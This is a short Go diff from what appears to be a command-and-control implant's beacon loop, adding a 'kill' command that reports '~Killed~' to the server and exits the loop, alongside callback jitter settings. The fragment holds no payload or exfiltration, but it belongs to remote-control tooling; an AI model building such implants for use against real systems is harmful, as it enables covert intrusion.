@@ -159,6 +159,13 @@ func main() {
 				Output:      "Success",
 				CommandUUID: instruct.CommandUUID,
 			}
+		} else if CommandType == "kill" {
+			destruct = types.GiveServerResult{
+				Uuid:        instruct.UpdateAgentConfig.Uuid,
+				Result:      "1",
+				Output:      "~Killed~",
+				CommandUUID: instruct.CommandUUID,
+			}
 		} else { // if CommandType == ""
 			destruct = types.GiveServerResult{
 				Uuid:        instruct.UpdateAgentConfig.Uuid,
@@ -174,6 +181,10 @@ func main() {
 		}
 		// logger.Logf(logger.Debug, "Sent encoded struct\n")
 		beacon.Close()
+
+		if CommandType == "kill" {
+			break
+		}
 		// Jitter Credit: Christian
 		Fre, _ := strconv.Atoi(CallbackFrequency)
 		Jitt, _ := strconv.Atoi(CallbackJitter)
